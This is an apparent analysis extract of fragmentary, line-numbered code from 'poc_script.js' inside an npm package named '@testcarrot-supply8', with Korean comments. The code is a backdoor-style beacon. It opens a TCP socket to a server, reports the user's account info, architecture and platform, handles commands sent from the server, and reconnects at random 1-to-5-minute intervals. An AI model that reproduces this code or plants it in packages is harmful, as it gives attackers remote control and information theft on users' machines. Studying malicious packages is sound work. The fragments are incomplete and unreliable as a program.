// File: tmp/tmptb4s3c_6/@testcarrot-supply8/package/poc_script.js
// ======================================================================
Line 2: const os = require('os')
Line 3: const net = require('net')
Line 4: const fs = require('fs')
Line 31: client = new net.Socket()
Line 42: {
    const message = data.toString().trim();
    console.log(`[서버로부터 메시지 수신]: ${message}`);
    // 여기서 서버가 보낸 명령어를 처리하는 로직을 추가할 수 있습니다.
    // 예: 파일 전송 시작, 특정 명령어 실행 등
    handleServerCommand(message);
  }
Line 43: data.toString().trim()
Line 44: console.log(`[서버로부터 메시지 수신]: ${message}`)
Line 57: {
    console.error(`- 에러 발생: ${err.message}`);
    // 소켓을 안전하게 파괴하고 재연결을 시도합니다.
    client.destroy();
    reconnect();
  }
Line 60: client.destroy()
Line 74: {
        const textToSend = command.substring(5).trim();
        sendToServer(`[ECHO 응답]: ${textToSend}`);
    }
Line 75: command.substring(5).trim()
Line 76: sendToServer(`[ECHO 응답]: ${textToSend}`)
Line 87: {
    client.write(data + '\n', 'utf8', (err) => {
      if (err) {
        console.error(`데이터 전송 중 오류 발생: ${err.message}`);
      } else {
        console.log(`[데이터 전송 완료]: ${data}`);
      }
    });
  }
Line 88: client.write(data + '\n', 'utf8', (err) => {
      if (err) {
        console.error(`데이터 전송 중 오류 발생: ${err.message}`);
      } else {
        console.log(`[데이터 전송 완료]: ${data}`);
      }
    })
Line 91: {
        console.log(`[데이터 전송 완료]: ${data}`);
      }
Line 92: console.log(`[데이터 전송 완료]: ${data}`)
Line 104: os.userInfo()
Line 105: os.arch()
Line 106: os.platform()
Line 118: sendToServer(JSON.stringify(infoPayload))
Line 124: {
  // 재연결 시도가 이미 예약되어 있다면 중복 실행을 방지합니다.
  if (isReconnecting) return;
  isReconnecting = true;

  // 1분에서 5분 사이의 랜덤한 시간 이후에 재연결을 시도합니다.
  const retryInterval = Math.floor(Math.random() * (RECONNECT_MAX_INTERVAL - RECONNECT_MIN_INTERVAL + 1)) + RECONNECT_MIN_INTERVAL;
  console.log(`약 ${(retryInterval / 1000 / 60).toFixed(1)}분 후에 재연결을 시도합니다...`);

  setTimeout(() => {
    console.log('재연결 시도...');
    connectToServer();
  }, retryInterval);
}
Line 133: setTimeout(() => {
    console.log('재연결 시도...');
    connectToServer();
  }, retryInterval)
